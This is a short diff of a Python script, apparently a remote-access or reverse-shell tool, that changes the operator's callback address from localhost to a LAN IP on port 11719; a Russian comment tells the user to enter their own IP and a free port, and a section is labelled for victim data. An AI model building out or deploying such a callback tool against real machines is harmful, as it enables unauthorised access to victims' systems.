@@ -3,7 +3,7 @@ import os, sys
 import subprocess as sp
 
 # Your data
-sniff_data = ('127.0.0.1', 11719) # В реальных условиях вы ставите ваш IP и любой совободный порт
+sniff_data = ('192.168.1.54', 11719) # В реальных условиях вы ставите ваш IP и любой совободный порт
 
 # Data victim
 connect = None
